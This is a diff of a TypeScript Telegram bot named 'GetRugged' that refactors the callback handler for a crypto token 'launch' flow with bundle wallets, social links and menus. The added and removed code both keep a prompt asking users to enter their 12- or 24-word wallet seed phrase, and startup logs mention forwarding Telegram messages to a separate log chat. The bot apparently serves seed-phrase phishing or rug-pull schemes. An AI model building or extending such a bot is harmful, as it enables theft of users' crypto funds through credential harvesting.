     launchSessions.set(chatId, { stage: 'awaiting_socials', draft: updatedDraft });
-
     await ctx.answerCbQuery(`${SOCIAL_PLATFORM_LABELS[platform]} ${socials.includes(platform) ? 'added' : 'removed'}`);
     await ctx.editMessageReplyMarkup(buildSocialsKeyboard(updatedDraft.socials).reply_markup);
     return;
   }
 
-  if (ctx.callbackQuery.data === 'launch_socials_done' || ctx.callbackQuery.data === 'launch_socials_skip') {
+  if (data === 'launch_socials_done' || data === 'launch_socials_skip') {
     const chatId = getChatId(ctx);
     const session = launchSessions.get(chatId);
     if (!session || session.stage !== 'awaiting_socials') {
       await ctx.answerCbQuery('Start with Launch first.');
       return;
     }
-
-    const draft: LaunchDraft = {
-      ...session.draft,
-      socials: ctx.callbackQuery.data === 'launch_socials_skip' ? [] : session.draft.socials,
-    };
+    const draft: LaunchDraft = { ...session.draft, socials: data === 'launch_socials_skip' ? [] : session.draft.socials };
     launchSessions.set(chatId, { stage: 'awaiting_review', draft });
-
-    await ctx.answerCbQuery(ctx.callbackQuery.data === 'launch_socials_skip' ? 'Skipping socials' : 'Socials saved');
+    await ctx.answerCbQuery(data === 'launch_socials_skip' ? 'Skipping socials' : 'Socials saved');
     await showReview(ctx, draft);
     return;
   }
 
-  if (ctx.callbackQuery.data === 'launch_review_confirm') {
+  if (data === 'launch_review_confirm') {
     const chatId = getChatId(ctx);
     const session = launchSessions.get(chatId);
     if (!session || session.stage !== 'awaiting_review') {
       await ctx.answerCbQuery('Start with Launch first.');
       return;
     }
-
     launchSessions.set(chatId, { stage: 'awaiting_wallet_connection', draft: session.draft });
     await ctx.answerCbQuery('Launch confirmed');
-    await ctx.reply(
-      '✅ Confirmed & saved.\n\n🔐 Connect a wallet\n🔑 Enter your 12 or 24-word seed phrase:',
-      launchSetupKeyboard,
-    );
+    await ctx.reply('✅ Confirmed & saved.\n\n🔐 Connect a wallet\n🔑 Enter your 12 or 24-word seed phrase:', launchSetupKeyboard);
     return;
   }
 
-  if (!ctx.callbackQuery.data.startsWith('launch_wallet_count:')) {
-    if (ctx.callbackQuery.data === 'menu_launch') {
-      const chatId = getChatId(ctx);
-      await ctx.answerCbQuery('Starting launch setup');
-      await startLaunchSetup(ctx, chatId);
-      return;
-    }
-
-    if (ctx.callbackQuery.data === 'menu_wallets') {
-      const chatId = getChatId(ctx);
-      const result = launchResults.get(chatId);
-      await ctx.answerCbQuery('Opening wallets');
-      if (!result) {
-        await showMainMenu(ctx, 'No bundle wallets are stored for this chat yet.');
-        return;
-      }
-
-      await replyWithWalletList(ctx, result);
-      await replyWithWalletControls(ctx, result);
-      return;
-    }
-
-    if (ctx.callbackQuery.data === 'menu_portfolio') {
-      await ctx.answerCbQuery('Opening portfolio');
-      await showMainMenu(ctx, '📂 Portfolio\n\nPortfolio view is coming soon.');
-      return;
-    }
-
-    if (ctx.callbackQuery.data === 'menu_cancel') {
-      const chatId = getChatId(ctx);
-      launchSessions.delete(chatId);
-      await ctx.answerCbQuery('Setup cancelled');
-      await showMainMenu(ctx, '❌ Launch setup cancelled.');
-      return;
-    }
-
-    if (ctx.callbackQuery.data === 'menu_back') {
-      await ctx.answerCbQuery('Back to menu');
-      await showMainMenu(ctx, '🏠 Back to main menu.');
-      return;
-    }
-
-    return next();
-  }
-
-  const chatId = getChatId(ctx);
-  const session = launchSessions.get(chatId);
-  if (!session || session.stage !== 'awaiting_wallet_count') {
-    await ctx.answerCbQuery('Start with /launch first.');
+  if (data === 'menu_launch') {
+    const chatId = getChatId(ctx);
+    await ctx.answerCbQuery('Starting launch setup');
+    await startLaunchSetup(ctx, chatId);
     return;
   }
 
-  const walletCountValue = Number(ctx.callbackQuery.data.split(':')[1]);
-  if (!isValidWalletCount(walletCountValue)) {
-    await ctx.answerCbQuery('Invalid wallet count.');
+  if (data === 'menu_wallets') {
+    const chatId = getChatId(ctx);
+    const result = launchResults.get(chatId);
+    await ctx.answerCbQuery('Opening wallets');
+    if (!result) {
+      await showMainMenu(ctx, 'No bundle wallets are stored for this chat yet.');
+      return;
+    }
+    await replyWithWalletList(ctx, result);
+    await replyWithWalletControls(ctx, result);
     return;
   }
 
-  const draft: LaunchDraft = {
-    tokenName: session.tokenName,
-    tokenSymbol: session.tokenSymbol,
-    description: session.description,
-    imageFileId: session.imageFileId,
-    walletCount: walletCountValue,
-    socials: [],
-    address: undefined,
-    balance: undefined,
-  };
-  launchSessions.set(chatId, { stage: 'awaiting_socials', draft });
+  if (data === 'menu_portfolio') {
+    await ctx.answerCbQuery('Opening portfolio');
+    await showMainMenu(ctx, '📂 Portfolio\n\nPortfolio view is coming soon.');
+    return;
+  }
 
-  console.log('Bundle size selected:', {
-    chatId,
-    walletCount: walletCountValue,
-    tokenName: session.tokenName,
-    tokenSymbol: session.tokenSymbol,
-  });
-  await ctx.answerCbQuery(`Using ${walletCountValue} wallets`);
-  await ctx.reply(
-    `✅ Bundle size set: ${walletCountValue} wallets\n\n🔗 Add socials (optional): choose a platform or skip.`,
-    buildSocialsKeyboard([]),
-  );
+  if (data === 'menu_cancel') {
+    const chatId = getChatId(ctx);
+    launchSessions.delete(chatId);
+    await ctx.answerCbQuery('Setup cancelled');
+    await showMainMenu(ctx, '❌ Launch setup cancelled.');
+    return;
+  }
+
+  if (data === 'menu_back') {
+    await ctx.answerCbQuery('Back to menu');
+    await showMainMenu(ctx, '🏠 Back to main menu.');
+    return;
+  }
+
+  if (data.startsWith('launch_wallet_count:')) {
+    const chatId = getChatId(ctx);
+    const session = launchSessions.get(chatId);
+    if (!session || session.stage !== 'awaiting_wallet_count') {
+      await ctx.answerCbQuery('Start with /launch first.');
+      return;
+    }
+    const walletCountValue = Number(data.split(':')[1]);
+    if (!isValidWalletCount(walletCountValue)) {
+      await ctx.answerCbQuery('Invalid wallet count.');
+      return;
+    }
+    const draft: LaunchDraft = {
+      tokenName: session.tokenName,
+      tokenSymbol: session.tokenSymbol,
+      description: session.description,
+      imageFileId: session.imageFileId,
+      walletCount: walletCountValue,
+      socials: [],
+    };
+    launchSessions.set(chatId, { stage: 'awaiting_socials', draft });
+    console.log('Bundle size selected:', { chatId, walletCount: walletCountValue, tokenName: session.tokenName, tokenSymbol: session.tokenSymbol });
+    await ctx.answerCbQuery(`Using ${walletCountValue} wallets`);
+    await ctx.reply(`✅ Bundle size set: ${walletCountValue} wallets\n\n🔗 Add socials (optional): choose a platform or skip.`, buildSocialsKeyboard([]));
+    return;
+  }
+
+  return next();
 });
 
 const startBot = async () => {
   console.log('Checking Telegram bot token...');
   const me = await withTimeout(bot.telegram.getMe(), 'Telegram getMe');
   console.log(`Telegram bot authenticated as @${me.username ?? me.first_name}`);
-
   console.log('Starting Telegram polling...');
   bot.launch({ dropPendingUpdates: true }).catch((error) => {
     console.error('Telegram polling stopped unexpectedly:', error);
     process.exitCode = 1;
   });
   console.log('GetRugged online');
-  if (isDryRunEnabled()) {
-    console.log('DRY_RUN mode enabled: launch flow is simulated locally and no on-chain actions will be sent.');
-  }
-  if (TELEGRAM_LOG_CHAT_ID) {
-    console.log(`Telegram message logging enabled for chat ${TELEGRAM_LOG_CHAT_ID}.`);
-  }
+  if (isDryRunEnabled()) console.log('DRY_RUN mode enabled: launch flow is simulated locally and no on-chain actions will be sent.');
+  if (TELEGRAM_LOG_CHAT_ID) console.log(`Telegram message logging enabled for chat ${TELEGRAM_LOG_CHAT_ID}.`);
 };
 
 startBot().catch((error) => {
